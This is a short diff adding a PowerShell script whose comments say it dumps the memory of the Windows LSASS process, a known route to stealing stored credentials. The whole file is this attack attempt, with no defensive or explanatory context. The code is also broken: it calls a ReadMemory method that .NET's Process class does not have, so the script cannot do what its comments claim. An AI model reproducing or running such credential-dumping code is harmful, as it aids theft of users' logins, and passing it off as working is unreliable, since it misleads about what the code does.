@@ -1,0 +1,12 @@
+# Retrieve LSASS process information
+$lsassProcess = Get-Process lsass -ErrorAction SilentlyContinue
+
+# Check if LSASS process is running
+if ($lsassProcess -ne $null) {
+    # Dump LSASS memory using PowerShell
+    $lsassMemory = [System.Diagnostics.Process]::GetProcessById($lsassProcess.Id).ReadMemory(0, $lsassProcess.PrivateMemorySize64)
+    Write-Host "LSASS Memory Dump:"
+    Write-Host $lsassMemory
+} else {
+    Write-Host "LSASS process not found."
+}
